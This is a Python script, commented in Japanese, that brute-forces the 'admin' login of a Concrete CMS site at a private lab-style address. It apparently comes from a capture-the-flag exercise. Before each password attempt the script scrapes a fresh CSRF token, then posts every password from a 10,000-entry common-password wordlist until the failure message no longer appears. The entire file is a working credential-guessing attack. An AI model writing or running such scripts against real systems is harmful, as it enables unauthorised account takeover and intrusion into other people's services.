import requests
from bs4 import BeautifulSoup

# URL
# ログイン画面 GET
LOGIN_URL = "http://10.10.175.218:85/app/castle/index.php/login"
# POST
AUTH_URL = (
    "http://10.10.175.218:85/app/castle/index.php/login/authenticate/concrete"
)

# ユーザー名、パスワードリスト
USERNAME = "admin"
PASSWORD_LIST_PATH = "/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt"

# ヘッダー
USER_PARAM_NAME = "uName"
PW_PARAM_NAME = "uPassword"
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101"
CSRF_TOKEN = "ccm_token"
LOGIN_FAILED_KEYWORD = "Invalid username or password."


def get_ccm_token_and_cookies(session, url):
    response = session.get(url, headers={"User-Agent": USER_AGENT})
    if response.status_code != 200:
        print("Failed to get login page")
        return None, None

    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": CSRF_TOKEN})

    if token_input is None:
        print("ccm_token not found")
        return None, None

    return token_input["value"], response.cookies


def try_login(session, url, username, password, token, cookies):
    data = {
        USER_PARAM_NAME: username,
        PW_PARAM_NAME: password,
        CSRF_TOKEN: token,
    }
    headers = {"User-Agent": USER_AGENT}
    response = session.post(url, data=data, headers=headers, cookies=cookies)

    if LOGIN_FAILED_KEYWORD not in response.text:
        print(f"Success! Password: {password}")
        return True
    return False


def main():
    with open(PASSWORD_LIST_PATH, "r") as f:
        passwords = [line.strip() for line in f]

    session = requests.Session()

    for password in passwords:
        print(f"Trying password: {password}")
        ccm_token, cookies = get_ccm_token_and_cookies(session, LOGIN_URL)
        if ccm_token is None:
            continue

        if try_login(
            session, AUTH_URL, USERNAME, password, ccm_token, cookies
        ):
            break


if __name__ == "__main__":
    main()
